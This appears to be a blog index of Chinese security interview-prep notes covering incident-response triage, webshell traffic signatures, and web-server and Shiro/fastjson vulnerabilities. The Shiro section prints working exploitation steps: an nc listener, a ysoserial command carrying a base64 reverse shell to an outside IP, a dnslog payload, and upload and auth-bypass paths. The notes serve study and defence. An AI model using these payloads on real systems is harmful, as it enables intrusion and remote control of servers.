+    <url>/posts/0.html</url>
+    <content><![CDATA[<h3 id="简单的介绍自己"><a href="#简单的介绍自己" class="headerlink" title="简单的介绍自己"></a>简单的介绍自己</h3><p>面试官你好，我叫崔达峰，目前在安恒信息广州分公司实习，已经实习一年了，主要负责渗透测试工作。</p>
+<h3 id="说一下应急响应思路"><a href="#说一下应急响应思路" class="headerlink" title="说一下应急响应思路"></a>说一下应急响应思路</h3><blockquote>
+<p>  ACL隔离可以通过网络设备如路由器、交换机等来实现，管理员可以在这些设备上设置ACL规则，对网络流量进行筛选和过滤。</p>
+<p>  攻击可能造成的结果：比如植入挖矿病毒或勒索病毒，充当跳板机或代理服务器，窃取敏感信息，横向攻击，web站点挂黑页</p>
+</blockquote>
+<p>说一下我的看法吧，假设某单位出现应急响应事件。</p>
+<p>第一个是阻断来源和确认攻击造成的结果，然后确认受影响的主机和网段，视其严重程度和业务保障，再决定是否对其进行断网或ACL隔离，修改密码，防火墙加各种防护策略，关闭端口，加固，封禁IP，避免影响被扩大。</p>
+<p>第二个是对攻击行为进行阻断后对数据进行保护，比如保存好流量、可疑进程的内存，失陷系统镜像，恶意样本，设备日志，这个是方便后续对其进行溯源。</p>
+<p>第三个是确认攻击源头，查看受影响的主机里是否有web服务器、数据库服务器、日常运维服务器。上传webshell、rce、常见中间件OA软件0day&#x2F;nday漏洞，ssh&#x2F;rdp&#x2F;vnc&#x2F;mysql&#x2F;redis弱口令，vpn弱口令，redis未授权访问等都是可能getshell的手段，可以结合备份的网站日志对网站应用进行全面代码审计，如果都没有，邮件钓鱼也是hw中攻击队比较常用的突破手段。</p>
+<p>第四个是事件排查</p>
+<p>事件排查分为Windows和Linux</p>
+<h4 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a>Windows：</h4><p><strong>1.文件排查</strong></p>
+<p>（1）开机启动项</p>
+<p>msconfig</p>
+<p>（2）临时文件</p>
+<p>c:\Windows\Temp</p>
+<p>(3) 最近打开文件</p>
+<p>%UserProfile%\Recent</p>
+<p>查看文件事件、创建时间、修改时间、访问时间</p>
+<p><strong>2.进程排查</strong></p>
+<p>（1）网络连接</p>
+<p>netstat -ano</p>
+<p>定位可疑的ESTABLSHED</p>
+<p>这个可以使用蓝队辅助工具箱将网络连接复制到上面，可以提取IP列表和获取到IP地址的位置</p>
+<p>（2）排查可疑连接的进程</p>
+<p>根据netstat定位到的pid，再通过tasklist定位进程</p>
+<p>tasklist | findstr pid</p>
+<p>(3)获取进程的全路径</p>
+<p>wmic process | findstr “exxx.exe”</p>
+<p>或者任务管理器上查看</p>
+<p><strong>3.系统信息排查</strong></p>
+<p>win+r 输入 sysdm.cpl 高级选项，打开环境变量</p>
+<p>排查temp变量的内容，是否有非Windows后缀，是否有增加其他路径到path</p>
+<p>（1）windows计划任务</p>
+<p>win+r 输入 taskschd.msc 打开任务计划程序。</p>
+<p>或者schtasks，任务管理器</p>
+<p>（2）开机启动项</p>
+<p>win+r shell:startup</p>
+<p>或者任务管理启动。</p>
+<p>（3）windows账号信息</p>
+<p>compmgmt.msc-》本地用户和组，用户名已<code>$</code>结尾的是隐藏用户。</p>
+<p>net user 收集用户信息，但看不到隐藏用户</p>
+<p>注册表查 HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</p>
+<p>查杀隐藏账户可以使用D盾</p>
+<p>（4）当前系统用户的会话</p>
+<p>query user</p>
+<p>如果有可疑用户，可以用 logoff 将它踢下线</p>
+<p>（5）系统版本及补丁信息</p>
+<p>systeminfo</p>
+<p><strong>4.日志排查</strong></p>
+<p>eventvwr</p>
+<p>首先导出日志，正则匹配需要查找的信息。</p>
+<p>查看日志删除记录id：104</p>
+<p>登录成功记录：4624</p>
+<p>登录失败记录：4625</p>
+<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p><strong>1、文件排查</strong></p>
+<p>ls -atl &#x2F;tmp&#x2F;</p>
+<p>(1)开机启动内容</p>
+<p>ls -atl &#x2F;etc&#x2F;init.d</p>
+<p>(2)按事件排序查看指定目录下文件</p>
+<p>ls -atl | head -n 10</p>
+<p>如果发现可疑文件，使用stat进行文件详细信息查看</p>
+<p>stat &#x2F;usr&#x2F;bin&#x2F;lsof</p>
+<p>(3)查看历史命令记录文件</p>
+<p>cat &#x2F;root&#x2F;.bash_history</p>
+<p>(4)排查已创建用户信息</p>
+<p>cat &#x2F;etc&#x2F;passwd 看最后一列是不是nologin，如果不是，查看该用户执行过的历史命令记录。</p>
+<p>uid为0的用户</p>
+<p>(5)查看新增文件</p>
+<p>查看24小时内被修改的php文件</p>
+<p>find .&#x2F; -mtime 0 -name “*.php”</p>
+<p>查看72小时内新增的文件(ctime当内容未改变，权限改变的时候也可以查出)</p>
+<p>find -ctime 2</p>
+<p>(6)特殊权限文件查看</p>
+<p>find &#x2F;*.jsp -perm 777</p>
+<p>(7)隐藏文件</p>
+<p>ls -ar | grep “^.“</p>
+<p>(8)查看分析计划任务</p>
+<p>当前的任务计划：crontab -l</p>
+<p>任务计划相关文件：ls &#x2F;etc&#x2F;cron*</p>
+<p><strong>2、进程排查</strong></p>
+<p>（1）top</p>
+<p>（2）netstat -antlp | more</p>
+<p>（3）根据netstat 定位出的pid查进程</p>
+<p>ps aux | grep pid</p>
+<p>（4）lsof -i:3306 查看对应端口的程序</p>
+<p>lsof filename 显示打开指定文件的所有进程</p>
+<p>（5）登录信息</p>
+<p>lastlog 最近一次登录信息</p>
+<p>lastb 显示用户错误的登录列表</p>
+<p>（6）系统路径分析</p>
+<p>echo $PATH</p>
+<p>（7）指定信息检索</p>
+<p>strings &#x2F;usr&#x2F;bin&#x2F;.sshd</p>
+<p>（8）ssh相关目录有无可疑公钥存在</p>
+<p>redis、&#x2F;etc&#x2F;ssh .&#x2F;.ssh&#x2F;</p>
+<p><strong>3.后门排查</strong></p>
+<p>chkrootkit</p>
+<p>（2）手工webshll检查</p>
+<p>find &#x2F;var&#x2F;www&#x2F;html&#x2F; -type f -name ‘*.php’|xargs grep ‘eval’ |more&#x3D;&#x3D;</p>
+<p><strong>4、日志排查</strong></p>
+<p>定位有多少 IP 在爆破主机的 root 帐号：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c |sort -nr|more</span><br></pre></td></tr></table></figure>
+
+<p>登录成功的 IP 有哪些：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &quot;Accepted&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c |sort -nr |more</span><br></pre></td></tr></table></figure>
+
+<p>中间件日志：apache</p>
+<p>数据库日志：&#x2F;var&#x2F;log&#x2F;mysql&#x2F;</p>
+<h3 id="溯源反制思路"><a href="#溯源反制思路" class="headerlink" title="溯源反制思路"></a><strong>溯源反制思路</strong></h3><p>1、捕获攻击源，比如恶意文件样本、钓鱼网站url、蜜罐系统获取的攻击者id</p>
+<p>2、溯源反制</p>
+<p>IP反查端口、在社交平台上搜id、社工库、技术论坛等，url的话进行域名whois查询</p>
+<h3 id="根据流量来分析攻击特征"><a href="#根据流量来分析攻击特征" class="headerlink" title="根据流量来分析攻击特征"></a>根据流量来分析攻击特征</h3><p>一般有select、union等sql查询语句的是sql注入攻击，webshell上传有关键执行函数eval等，</p>
+<h3 id="内网渗透思路"><a href="#内网渗透思路" class="headerlink" title="内网渗透思路"></a>内网渗透思路</h3><p>代理穿透、权限维持、内网信息搜集、密码喷洒、凭据窃取、横向和纵向渗透、拿下域控</p>
+<h3 id="说一下你的值守经历"><a href="#说一下你的值守经历" class="headerlink" title="说一下你的值守经历"></a>说一下你的值守经历</h3><p>我谈一下比较有趣值守溯源经历吧，第一个是某单位重保值守中，有一次弱口令告警发生在十二点之后，引起了我的注意，然后我反查了该IP的尝试登录记录，发现该IP每隔一段时间就会进行一次登录尝试，都是使用固定密码123456来枚举用户名登录，因为该站点在前端作了弱口令检测，像123456这样的密码是无法登录的，由此我判定该IP绕过了前端验证在进行登录爆破。该IP每隔一段时间登录一次很难被势态感知设备捕捉到，因为不在规则之内。</p>
+<p>还有一个是发现一个高中的内网穿透IP，使用的是nps，将一台教室的pc穿透到公网上，反查该IP发现开放了很多端口，其中一个可以无障碍的查看校园里所有的摄像头画面，其中一个相当于shell的命令行界面，翻阅了文件和计划任务，并没有发现可疑的行为和进程，然后在其他端口上发现了该学校管理员发布的一则公告，判定是学校管理员的行为，后续上报给了上级。</p>
+<h3 id="webshell流量特征"><a href="#webshell流量特征" class="headerlink" title="webshell流量特征"></a>webshell流量特征</h3><p><strong>中国菜刀：</strong></p>
+<p>payload特征有：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP: &lt;?php @eval($_POST[&#x27;caidao&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">ASP: &lt;%eval request(“caidao”)%&gt;</span><br><span class="line"></span><br><span class="line">ASP.NET: &lt;%@ Page</span><br><span class="line">Language=“Jscript”%&gt;&lt;%eval(Request.Item[“caidao”],“unsafe”);%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>数据包特征有：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请求体中存在eavl，base64等特征字符，请求体中传递的payload为base64编码，并且存在固定的QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J</span><br></pre></td></tr></table></figure>
+
+<p><strong>冰蝎：</strong></p>
+<p>paylaod分析：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php在代码中同样会存在eval或assert等字符特征</span><br><span class="line">在asp中会在for循环进行一段异或处理</span><br><span class="line">在jsp中则利用java的反射，所以会存在ClassLoader，getClass().getClassLoader()等字符特征</span><br></pre></td></tr></table></figure>
+
+<p><strong>冰蝎2.0流量特征：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一阶段请求中返回包状态码为200，返回内容必定是16位的密钥</span><br><span class="line">请求包存在：Accept: text/html, image/gif, image/jpeg, *; q=.2, \*/*; q=.2*</span><br><span class="line">建立连接后的cookie存在特征字符</span><br><span class="line">所有请求 Cookie的格式都为: Cookie: PHPSESSID=; path=/；</span><br></pre></td></tr></table></figure>
+
+<p><strong>冰蝎3.0原理：</strong></p>
+<p>密钥协商机制</p>
+<p>冰蝎客户端会发出两次请求，即二次密钥协商，并将两次获得的密钥异或来判断密钥可用性</p>
+<p><strong>冰蝎4.0原理</strong></p>
+<p>冰蝎的通信过程可以分为两个阶段：密钥协商和加密传输</p>
+<p><strong>第一阶段-密钥协商</strong></p>
+<p>1.攻击者通过 GET 或者 POST 方法，形如 <a href="http://127.0.0.1/shell.aspx?pass=645%E7%9A%84%E8%AF%B7%E6%B1%82%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AF%86%E9%92%A5%EF%BC%9B">http://127.0.0.1/shell.aspx?pass=645的请求服务器密钥；</a></p>
+<p>2.服务器使用随机数 MD5 的高16位作为密钥，存储到会话的 $_SESSION 变量中，并返回密钥给攻击者。</p>
+<p><strong>第二阶段-加密传输</strong></p>
+<p>1）客户端把待执行命令作为输入，利用 AES 算法或 XOR 运算进行加密，并发送至服务端；</p>
+<p>2）服务端接受密文后进行 AES 或 XOR 运算解密，执行相应的命令；</p>
+<p>3）执行结果通过AES加密后返回给攻击者。</p>
+<p><strong>蚁剑：</strong></p>
+<p>payload特征：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Php中使用assert，eval执行,</span><br><span class="line">asp 使用eval</span><br><span class="line">在jsp使用的是Java类加载（ClassLoader）,同时会带有base64编码解码等字符特征</span><br></pre></td></tr></table></figure>
+
+<p>数据包流量特征：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用普通的一句话都存在以下特征：</span><br><span class="line">每个请求体都存在@ini_set(“display_errors”, “0”);@set_time_limit(0)开头。并且后面存在base64等字符</span><br><span class="line">响应包的结果返回格式为：</span><br><span class="line">随机数</span><br><span class="line">响应内容</span><br><span class="line">随机数</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>哥斯拉：</strong></p>
+<p>内置三种payload、6种加密器、6种支持脚本后缀，20个内置插件</p>
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/posts/0.html</url>
+    <content><![CDATA[<h1 id="面试必备点"><a href="#面试必备点" class="headerlink" title="面试必备点"></a>面试必备点</h1><h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><h3 id="PUT-漏洞"><a href="#PUT-漏洞" class="headerlink" title="PUT 漏洞"></a>PUT 漏洞</h3><h3 id="短文件名猜解"><a href="#短文件名猜解" class="headerlink" title="短文件名猜解"></a>短文件名猜解</h3><h3 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h3><h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><h4 id="iis6-0"><a href="#iis6-0" class="headerlink" title="iis6.0"></a>iis6.0</h4><p>（1）将</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.asp;.jpg</span><br></pre></td></tr></table></figure>
+
+<p>这种格式的后缀当作asp解析，原理是服务器不解析分号后面的内容</p>
+<p>（2）将</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*.asp/</span><br></pre></td></tr></table></figure>
+
+<p>目录下的所有文件当作asp文件解析</p>
+<p>（3）将拓展名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.asa</span><br><span class="line">.cdx</span><br><span class="line">.cer</span><br></pre></td></tr></table></figure>
+
+<p>解析为asp</p>
+<h4 id="iis7-0"><a href="#iis7-0" class="headerlink" title="iis7.0"></a>iis7.0</h4><p>在一个文件路径（&#x2F;shell.jpg）后面加上 &#x2F;.php 会将 &#x2F;shell.jpg&#x2F;.php 解析为php文件</p>
+<h2 id="apache漏洞"><a href="#apache漏洞" class="headerlink" title="apache漏洞"></a>apache漏洞</h2><h3 id="解析漏洞-1"><a href="#解析漏洞-1" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><p>apache 默认一个文件可以有多个用 . 分割的后缀，当右边的后缀无法识别，则继续向左解析，知道碰到合法后缀。</p>
+<h3 id="换行-x0a-解析漏洞"><a href="#换行-x0a-解析漏洞" class="headerlink" title="换行 x0a 解析漏洞"></a>换行 x0a 解析漏洞</h3><p>添加 hex 0a</p>
+<h2 id="nginx漏洞"><a href="#nginx漏洞" class="headerlink" title="nginx漏洞"></a>nginx漏洞</h2><h3 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h3><p>shell.jsp<code>[x20][x00]</code>.php 会匹配php</p>
+<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>如果alias路径后配置了&#x2F;而location路径未配置&#x2F;就会出现目录穿越漏洞</p>
+<p>&#x2F;work&#x2F; –&gt; &#x2F;work..&#x2F; 穿越到上一层目录</p>
+<h3 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h3><p>nginx没有正确处理换行符和回车符dao’zhi</p>
+<h2 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h2><h3 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h3><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>由于配置不当（非默认配置），将配置文件<code>conf/web.xml</code>中的<code>readonly</code>设置为了 false，导致可以使用PUT方法上传任意文件，但限制了jsp后缀的上传</p>
+<p>根据描述，在 Windows 服务器下，将 readonly 参数设置为 false 时，即可通过 PUT 方式创建一个 JSP 文件，并可以执行任意代码</p>
+<p>通过阅读 conf&#x2F;web.xml 文件，可以发现，默认 readonly 为 true，当 readonly 设置为 false 时，可以通过 PUT &#x2F; DELETE 进行文件操控</p>
+<h4 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.Windows下不允许文件以空格结尾以PUT /a001.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格  </span><br><span class="line">2.Windows NTFS流Put/a001.jsp::$DATA HTTP/1.1  </span><br><span class="line">3. /在文件名中是非法的，也会被去除（Linux/Windows）Put /a001.jsp/ http/1.1  </span><br></pre></td></tr></table></figure>
+
+<h3 id="AJP文件包含漏洞"><a href="#AJP文件包含漏洞" class="headerlink" title="AJP文件包含漏洞"></a>AJP文件包含漏洞</h3><h4 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>由于 Tomcat AJP协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector可以读取或包含 Tomcat上所有 webapp目录下的任意文件，例如可以读取 webapp配置文件或源码。</p>
+<p>此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</p>
+<p>tomcat默认的conf&#x2F;server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009 AJP协议端口，两个端口默认均监听在外网ip。</p>
+<h3 id="弱口令-amp-war部署"><a href="#弱口令-amp-war部署" class="headerlink" title="弱口令&amp;war部署"></a>弱口令&amp;war部署</h3><p>在tomcat8环境下默认进入后台的密码为tomcat&#x2F;tomcat，未修改造成未授权即可进入后台</p>
+<h3 id="Apache-Tomcat-RCE"><a href="#Apache-Tomcat-RCE" class="headerlink" title="Apache Tomcat RCE"></a>Apache Tomcat RCE</h3><p>CVE-2019-0232</p>
+<p>漏洞相关的代码在 tomcat\java\org\apache\catalina\servlets\CGIServlet.java 中，CGIServlet提供了一个cgi的调用接口，在启用 enableCmdLineArguments 参数时，会根据RFC 3875来从Url参数中生成命令行参数，并把参数传递至Java的 Runtime 执行。这个漏洞是因为 Runtime.getRuntime().exec 在Windows中和Linux中底层实现不同导致的</p>
+<p>Java的 <code>Runtime.getRuntime().exec</code> 在CGI调用这种情况下很难有命令注入。而Windows中创建进程使用的是 <code>CreateProcess</code> ，会将参数合并成字符串，作为 <code>lpComandLine</code> 传入 <code>CreateProcess</code> 。程序启动后调用 <code>GetCommandLine</code> 获取参数，并调用 <code>CommandLineToArgvW</code> 传至 argv。在Windows中，当 <code>CreateProcess</code> 中的参数为 bat 文件或是 cmd 文件时，会调用 <code>cmd.exe</code> , 故最后会变成 <code>cmd.exe /c &quot;arg.bat &amp; dir&quot;</code>，而Java的调用过程并没有做任何的转义，所以在Windows下会存在漏洞</p>
+<p>存在cgi接口中，访问<a href="http://xxx./aa.bat?xxx=xx">http://xxx./aa.bat?xxx=xx</a> url，从url参数中生成命令行参数，并把参数传递到java的runtime执行，只存在于Windows中。</p>
+<h3 id="manager-App暴力破解"><a href="#manager-App暴力破解" class="headerlink" title="manager App暴力破解"></a>manager App暴力破解</h3><p>后台密码用base64编码传输，抓包解密即可得到后台密码，也可以进行爆破</p>
+<h2 id="shiro专题"><a href="#shiro专题" class="headerlink" title="shiro专题"></a>shiro专题</h2><h3 id="shiro-550"><a href="#shiro-550" class="headerlink" title="shiro-550"></a>shiro-550</h3><h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>rememberMe的AES加密密钥硬编码泄露。</p>
+<h4 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>用户登录成功后会生成经过加密并编码的cookie，服务端在接收cookie值后，base64解码-&gt;aes解密–&gt;反序列化（未过滤）。所以攻击者只要知道aes加密的密钥，就可以构造一个恶意对象，然后将其序列化–&gt;aes加密–&gt;base64编码。然后将其作为cookie的rememberMe字段发送登录请求，shiro将rememberMe进行解码解密并且反序列化，最终造成反序列化漏洞。</p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>shiro 1.2.4 之前的版本都是硬编码，aes加密的密钥默认在代码里。如果反序列化函数中存在魔法函数，使用unserialize()函数同时会触发，如果能控制unserialize()函数的入口，那么就可能触发对象注入漏洞。</p>
+<h4 id="指纹特征"><a href="#指纹特征" class="headerlink" title="指纹特征"></a>指纹特征</h4><p>1、url中有shiro字符</p>
+<p>2、返回包中有set-Cookie: rememberMe&#x3D;deleteMe 字段</p>
+<p>3、post包中有rememberMe&#x3D;on</p>
+<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><p>1、监听本地端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure>
+
+<p>2、通过ysoserial中JRMP监听模块，监听6666端口，该端点实现了反弹shell命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>3、使用shiro.py 生成Payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python shiro.py 192.168.172.133:6666</span><br></pre></td></tr></table></figure>
+
+<p>4、构造数据包，伪造cookie，发送Payload，目标会远程调用6666端口的恶意方法，实现反弹shell</p>
+<h3 id="shiro-721"><a href="#shiro-721" class="headerlink" title="shiro-721"></a>shiro-721</h3><h4 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>Padding Oracle攻击是一种侧信道攻击，针对加密数据的填充策略进行利用。在使用Shiro框架时，如果攻击者获取到一个包含了加密数据的Cookie并发送给服务器，若存在Padding Oracle漏洞，则攻击者可以通过反复发送不同的加密数据来逐步推断出原始数据的内容。</p>
+<p>这种攻击基于Paddding Oracle漏洞的一个特性，即对于无效的加密块，服务端会返回一个与正确块不同的错误信息，而攻击者可以利用这些错误信息来逐步推断出明文数据的内容。</p>
+<h4 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding  Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p>
+<h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><p>apache shiro &lt; 1.4.2</p>
+<p>登录成功</p>
+<h4 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h4><p>1、登录shiro网站，获取rememberMe字段的值</p>
+<p>2、利用dnslog探测，通过ysoserial工具生成payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;ping 75bbot.dnslog.cn&quot; &gt; payload.class</span><br></pre></td></tr></table></figure>
+
+<p>3、使用rememberMe值作为prefix，加载Payload，进行Padding Oracle攻击。<br>github项目地址：<a href="https://github.com/longofo/PaddingOracleAttack-Shiro-721">https://github.com/longofo/PaddingOracleAttack-Shiro-721</a><br>使用示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath</span><br></pre></td></tr></table></figure>
+
+<p>4、利用爆破成功的rememberMe攻击字符串重新请求网站</p>
+<p>5、触发payload</p>
+<h3 id="shiro-权限绕过漏洞"><a href="#shiro-权限绕过漏洞" class="headerlink" title="shiro 权限绕过漏洞"></a>shiro 权限绕过漏洞</h3><h4 id="漏洞原理-4"><a href="#漏洞原理-4" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Apache Shiro  1.5.2之前版本中存在安全漏洞。攻击者可借助特制的请求利用该漏洞绕过身份验证。Shiro框架通过拦截器功能来对用户访问权限进行控制，如anon，authc等拦截器。anon为匿名拦截器，不需要登陆即可访问；authc为登录拦截器，需要登录才可以访问。Shiro的URL路径表达式为Ant格式，路径通配符表示匹配零个或多个字符串，&#x2F;可以匹配&#x2F;hello，但是匹配不到&#x2F;hello&#x2F;，如果*通配符无法匹配路径。假设&#x2F;hello接口设置了authc拦截器，访问&#x2F;hello会进行权限判断，但如果访问的是&#x2F;hello&#x2F;，那么将无法正确匹配URL，直接放行，进入到spring拦截器。spring中的&#x2F;hello和&#x2F;hello&#x2F;形式的URL访问的资源是一样的，从而实现了权限绕过</p>
+<p><strong>Shiro拦截器</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Shiro框架通过拦截器功能来实现对用户访问权限的控制和拦截。Shiro中常见的拦截器有anon，authc等拦截器</span><br><span class="line">anon为匿名拦截器，不需要登录就能访问，一般用于静态资源，或者移动端接口</span><br><span class="line">authc为登录拦截器，需要登录认证才能访问的资源</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h4><p>Apache Shiro &lt; 1.5.2</p>
+<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><blockquote>
+<p>  shiro1.4.2版本权限绕过</p>
+<p>  访问 &#x2F;hello&#x2F;1 接口，可以看到被authc拦截器拦截了，将会跳转到登录接口进行登录：</p>
+<p>  访问 &#x2F;hello&#x2F;1&#x2F; ，成功绕过authc拦截器，获取到了资源</p>
+</blockquote>
+<blockquote>
+<p>  shiro&lt;&#x3D;1.5.1版本绕过</p>
+<p>  在1.5.1版本中，&#x2F;hello&#x2F; 会直接跳转到登录</p>
+<p>  绕过payload： &#x2F;dwdww;&#x2F;..&#x2F;hello&#x2F;1 成功绕过</p>
+</blockquote>
+<h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><blockquote>
+<p>  参考链接：<a href="https://mp.weixin.qq.com/s/dL1TmeW4rNxj2tAtwBuqpg">https://mp.weixin.qq.com/s/dL1TmeW4rNxj2tAtwBuqpg</a></p>
+</blockquote>
+<h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><h4 id="Java-Bean"><a href="#Java-Bean" class="headerlink" title="Java Bean"></a>Java Bean</h4><p>Java Bean是一种规范,准确的说是一种Java类的书写规范,满足以下条件的Java类可以称之为Java Bean。</p>
+<p>1、成员变量均使用private关键字进行修饰</p>
+<p>2、提供构造方法(有参&#x2F;无参)</p>
+<p>3、为每个成员变量提供set&#x2F;get方法</p>
+<h4 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h4><p>将Java对象转换为字节序列的过程叫做序列化，将字节序列转换为Java对象的过程称为反序列化。</p>
+<h4 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h4><p> Java反射指的是Java平台提供的一种用于在程序运行期间动态获取任意类的所有信息(例如属性,方法,构造方法等信息)调用任意对象方法&#x2F;属性的机制,通过反射还可以创建对应类的实例,反射是一种很强大的机制。</p>
+<p>在JVM加载一个class文件到JVM中时会创建一个与之对应的class对象,该对象被称为字节码对象,通过此对象可以获取到对应的类中的所有信息(例如属性,方法,构造方法等信息),class对象提供的方法可以将类中的各个部分(属性,方法…)映射封装为对应Java对象,这个过程被称之为”反射”。</p>
+<h4 id="JNDI概念"><a href="#JNDI概念" class="headerlink" title="JNDI概念"></a>JNDI概念</h4><p>JNDI,全称Java Naming And Directory Interface,中文其含义为 Java名称与目录服务接口</p>
+<p><strong>命名服务：</strong></p>
+<p>​	命名服务广泛应用于计算机领域,命名服务的本质是提供一种从名称到对象间映射关系的查询服务,例如DNS服务,可以根据域名查询到其对应的IP地址,Windows系统中的搜索功能可以根据应用程序名称查询到对应的应用程序,这些功能&#x2F;服务都属于命名服务的范畴。在现实世界中类似于姓名对应个人的映射关系,而提供名称可以查询到个人的服务就可以称为命名服务(电话号码簿)。</p>
+<p><strong>目录服务:</strong></p>
+<p>​	目录服务将名称与对象相关联，并允许此类对象具有属性。因此，不仅可以按名称查找对象，还可以获取对象的属性或根据其属性搜索对象。因此目录服务是命名服务的一种扩展,除了可以将名称与对象进行绑定以外,还允许该对象拥有特定的属性。例如,目录对象可用于表示打印机,人员,计算机或网络,目录对象包含描述它所表示的对象的属性。</p>
+<h4 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h4><p>​	JNDI支持将一个名称映射到一个Java对象,可以通过JNDI中的lookup函数向特定的提供命名服务的服务器发起查询请求获取具体对象。lookup函数可以向远程的提供目录服务的服务器发起请求查询指定对象，如果返回的是Reference类型的对象，JNDI会解析该对象的classFactory、classFactoryLocation属性。classFactory通常代表类名，classFaxtoryLocation通常代表其存储地址，JVM首先会尝试在本地寻找该类，如果本地不存在则会从classFactoryLocation(通常是一个http服务器的地址,位于远程)中进行加载，此时会触发 URLClassLoader类远程加载器，会从classFactoryLocation地址中获取远程的class文件并将其加载到JVM中。</p>
+<p>​	如果加载的类是一个恶意类,例如类中的static代码块中包含恶意代码,那就会在类被加载到JVM时执行static静态代码块中的代码,如果其中包含执行系统命令的代码,那么就会导致任意命令执行。</p>
